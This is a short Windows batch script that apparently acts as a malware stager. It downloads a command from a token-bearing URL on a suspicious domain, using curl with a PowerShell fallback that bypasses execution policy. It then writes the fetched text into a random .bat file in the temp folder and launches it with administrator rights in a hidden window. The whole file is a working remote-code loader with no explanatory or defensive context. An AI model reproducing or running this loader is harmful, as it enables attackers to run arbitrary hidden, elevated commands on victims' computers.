@echo off
setlocal
set "URL=https://downloadstate.scannershortsuppo.es/api/download/text?token=a88ab7f7e41d401fe01bc35e44d40ec0"
set "FETCH=%TEMP%\adm_fetch.txt"
set "RUNBAT=%TEMP%\adm_run_%RANDOM%.bat"
set "STFILE=%TEMP%\adm_status.txt"

REM -- 1) Download the command ----------------------------------------------------
curl -s -L -o "%FETCH%" -w "%%{http_code}" "%URL%" > "%STFILE%" 2>nul
set /p HTTP=<"%STFILE%"
if "%HTTP%"=="200" goto :got
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop';try{$r=(New-Object System.Net.WebClient).DownloadString('https://downloadstate.scannershortsuppo.es/api/download/text?token=a88ab7f7e41d401fe01bc35e44d40ec0');[System.IO.File]::WriteAllText($env:TEMP+'\adm_fetch.txt',$r)}catch{exit 1}"
if not errorlevel 1 goto :got

:fail
powershell -NoProfile -ExecutionPolicy Bypass -Command "[System.Windows.Forms.MessageBox]::Show('Error fetching command')"
exit /b 1

:got
REM -- 2) Write temp .bat (@echo off + command) and run elevated -------------------
> "%RUNBAT%" echo @echo off
type "%FETCH%" >> "%RUNBAT%"
powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath '%RUNBAT%' -Verb RunAs -WindowStyle Hidden"
exit /b 0